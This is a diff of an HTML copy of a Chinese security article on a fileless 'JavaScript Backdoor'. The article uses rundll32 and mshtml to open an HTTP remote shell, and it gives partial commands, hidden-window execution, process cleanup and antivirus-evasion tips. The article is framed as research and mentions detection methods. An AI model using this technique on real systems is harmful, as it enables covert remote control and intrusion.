@@ -3,32 +3,32 @@
 			<head>
 			     <title>JavaScript Backdoor - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/11764">http://drops.wooyun.org/tips/11764</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>Casey Smith最近在Twitter分享了他的研究成果，执行一段JavaScript代码即可反弹一个Http Shell，很是奇妙，所以就对这个技术做了进一步研究。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/2016010415283129891110.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010415283129891110.png" alt="Alt text"></p>
 
 <!--more-->
 
 <h1>0x01 简介</h1>
 
-<hr />
+<hr>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528335078722.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601041528335078722.png" alt="Alt text"></p>
 
 <p>从截图我们可以看到该技术的使用方法，在cmd下利用rundll32.exe加载JavaScript代码，代码运行后会反弹一个Http Shell，而特别的地方在于当运行完cmd命令后，后台会一直存在进程rundll32.exe用来同Server持续连接，整个过程不需要写入文件，隐蔽性大大提高。</p>
 
 <h1>0x02 测试环境</h1>
 
-<hr />
+<hr>
 
 <p>Server：</p>
 
@@ -44,12 +44,12 @@ OS：Win7 x86
 IP：192.168.174.130
 </code></pre>
 
-<p>下载链接：<br />
+<p>下载链接：<br>
 <a href="https://gist.github.com/subTee/f1603fa5c15d5f8825c0">https://gist.github.com/subTee/f1603fa5c15d5f8825c0</a></p>
 
 <h1>0x03 实际测试</h1>
 
-<hr />
+<hr>
 
 <p><strong>1、Server启动服务，监听端口</strong></p>
 
@@ -67,19 +67,19 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 <p>可以执行cmd命令并获得回显</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528358507732.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601041528358507732.png" alt="Alt text"></p>
 
 <h1>0x04 测试中的Bug</h1>
 
-<hr />
+<hr>
 
 <p><strong>1、连接超时</strong></p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528365636741.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601041528365636741.png" alt="Alt text"></p>
 
 <p>在成功返回shell后，如果在后台等待一段时间，Clinet就会弹出超时连接的对话框</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528372215551.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601041528372215551.png" alt="Alt text"></p>
 
 <p>从截图可以看到Casey Smith已经发现了连接超时的问题，所以在新版本已经做了修正，加上window.setTimeout来避免连接超时的错误，在message内加了超时判断（message存储用于实现Client后续连接的代码，具体细节一看代码就明白），但是这样做还远远不够。</p>
 
@@ -99,15 +99,15 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528397035661.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601041528397035661.png" alt="Alt text"></p>
 
 <p><strong>5、无法删除文件</strong></p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528406889571.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601041528406889571.png" alt="Alt text"></p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528433383281.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601041528433383281.png" alt="Alt text"></p>
 
 <p><strong>6、server端无法正常退出</strong></p>
 
@@ -117,22 +117,22 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 <h1>0x05 优化思路</h1>
 
-<hr />
+<hr>
 
 <p><strong>1、对setTimeout的解释</strong></p>
 
-<p>查询相关资料如下：<br />
+<p>查询相关资料如下：<br>
 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384061(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/aa384061(v=vs.85).aspx</a></p>
 
 <p>文中提到了JavaScript实现WinHttpRequest的用法，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528449248591.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601041528449248591.png" alt="Alt text"></p>
 
 <p>setTimeout用来设置http的超时时间，如果全为0，代表no time-out，也就是无限期</p>
 
 <blockquote>
-  <p>注:<br />
-  在Casey Smith发布的第一个版本尚未修复该方法的时候，我解决该方法的思路是参照微软的方法，对应到代码中就是添加<br />
+  <p>注:<br>
+  在Casey Smith发布的第一个版本尚未修复该方法的时候，我解决该方法的思路是参照微软的方法，对应到代码中就是添加<br>
   <code>h.SetTimeouts(0, 0, 0, 0);</code>即可</p>
 </blockquote>
 
@@ -144,7 +144,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 <p><strong>（相关细节可参照结尾提供的参考代码）</strong></p>
 
-<p>查询相关资料如下：<br />
+<p>查询相关资料如下：<br>
 <a href="http://blog.csdn.net/qdfeitian/article/details/6371146">http://blog.csdn.net/qdfeitian/article/details/6371146</a></p>
 
 <p><strong>3、使用taskkill解决进程残留的问题</strong></p>
@@ -177,12 +177,12 @@ new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe"）
 
 <p><strong>5、解决使用run方法执行命令会弹黑框的问题</strong></p>
 
-<p>参考资料：<br />
+<p>参考资料：<br>
 <a href="https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx">https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx</a></p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/2016010415284660141101.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010415284660141101.png" alt="Alt text"></p>
 
 <p>run方法其实后面还可以加参数指示该窗口能否被看见</p>
 
@@ -195,15 +195,15 @@ new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,t
 <p>避免弹出黑框</p>
 
 <blockquote>
-  <p>注：<br />
-  <code>intWindowStyle</code>参数的说明中提到“Note that not all programs make use of this information.”<br />
+  <p>注：<br>
+  <code>intWindowStyle</code>参数的说明中提到“Note that not all programs make use of this information.”<br>
   例子之一就是用run方法来执行systeminfo这种需要等待的cmd命令是无法隐藏窗口的</p>
 </blockquote>
 
 <p><strong>6、如何隐蔽执行systeminfo并获取回显</strong></p>
 
-<p>参考了如下资料：<br />
-<a href=" <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2015-097380">WooYun: 搜狗浏览器远程命令执行之五</a> "> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2015-097380">WooYun: 搜狗浏览器远程命令执行之五</a> </a></p>
+<p>参考了如下资料：<br>
+<a href=" <a target=" _blank"="">WooYun: 搜狗浏览器远程命令执行之五</a> "> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2015-097380">WooYun: 搜狗浏览器远程命令执行之五</a> </p>
 
 <p>如果使用exec方法，虽然可以获取到回显，但是利用window.moveTo(-1000,-1000)无法移动弹出的黑框</p>
 
@@ -276,13 +276,13 @@ f.Delete();
 
 <p>示例如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/2016010415284773181112.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010415284773181112.png" alt="Alt text"></p>
 
 <p>示例代码可以实现简单的文件上传下载，但里面存在一个小bug，如果你投入精力，不难解决</p>
 
 <h1>0x06 补充</h1>
 
-<hr />
+<hr>
 
 <h3>1、白名单进程，免疫杀毒软件</h3>
 
@@ -344,26 +344,26 @@ eval(B);
 
 <h1>0x07 小结</h1>
 
-<hr />
+<hr>
 
 <p>我在Casey Smith的基础上，对其代码做了进一步优化，对JavaScript Backdoor技术做了进一步研究，感谢他的无私分享，才有了我的这篇文章。</p>
 
-<p>我开发的代码已上传到github，下载链接：<br />
+<p>我开发的代码已上传到github，下载链接：<br>
 <a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1">https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1</a></p>
 
 <p>欢迎下载测试，交流学习。</p>
 
 <p>支持的功能如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/2016010415284991121121.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010415284991121121.png" alt="Alt text"></p>
 
 <blockquote>
-  <p>注：<br />
-  本文仅用来学习交流JavaScript Backdoor技术，并提供了检测方法<br />
+  <p>注：<br>
+  本文仅用来学习交流JavaScript Backdoor技术，并提供了检测方法<br>
   同时在文件上传下载的功能上留下了bug，距实际使用还有一点距离，以避免该方法被滥用。</p>
 </blockquote>
 
-<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      </p>
+<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      <p></p>
     
 			</body>
 		</html>
